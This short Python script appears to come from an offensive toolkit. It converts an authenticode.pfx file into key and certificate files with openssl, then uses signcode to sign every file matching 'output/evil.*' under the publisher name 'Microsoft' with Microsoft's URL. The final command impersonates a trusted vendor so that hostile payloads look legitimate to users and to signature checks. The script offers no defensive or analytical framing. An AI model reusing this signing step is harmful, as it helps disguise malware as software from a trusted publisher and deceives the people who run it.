#signing

import os, sys

def start():
    os.system("openssl pkcs12 -in authenticode.pfx -nocerts -nodes -out key.pem")
    os.system("openssl rsa -in key.pem -outform PVK -pvk-strong -out authenticode.pvk")
    os.system("openssl pkcs12 -in authenticode.pfx -nokeys -nodes -out cert.pem")
    os.system("openssl crl2pkcs7 -nocrl -certfile cert.pem -outform DER -out authenticode.spc")

    os.system("signcode -spc authenticode.spc -v authenticode.pvk -a sha1 -$ commercial -n Microsoft -i http://www.Microsoft.com/ -t http://timestamp.verisign.com/scripts/timstamp.dll -tr 10 output/evil.*")